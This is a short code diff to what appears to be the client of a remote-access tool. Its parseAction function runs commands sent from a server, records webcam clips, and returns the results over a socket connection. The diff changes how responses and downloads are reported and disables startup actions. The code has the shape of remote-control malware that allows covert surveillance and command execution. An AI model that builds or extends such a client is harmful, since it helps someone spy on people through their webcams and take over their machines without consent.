@@ -305,8 +305,15 @@ const parseAction = async (action) => {
             await runWebcamClip();
             return;
         }
-        const result = await runCommand(command, payload);
-        await sendCommand({ response: { data: result }});
+        let result = await runCommand(command, payload);
+        try {
+            result = JSON.parse(result);
+            if (result.download) {
+                await sendCommand({ response: result});
+            }
+        } catch (e) {
+            await sendCommand({ response: { data: result }});
+        }
     } catch(err) {
         await sendCommand({ response: { error: `Error: ${err.message}` }});
     }
@@ -314,7 +321,8 @@ const parseAction = async (action) => {
 
 // Connect to server function
 const connectToServer = async () => {
-    await startUpActions();
+    //TODO: fix start up actions
+    //await startUpActions();
     try {
         client = new Socket();
         const options = {
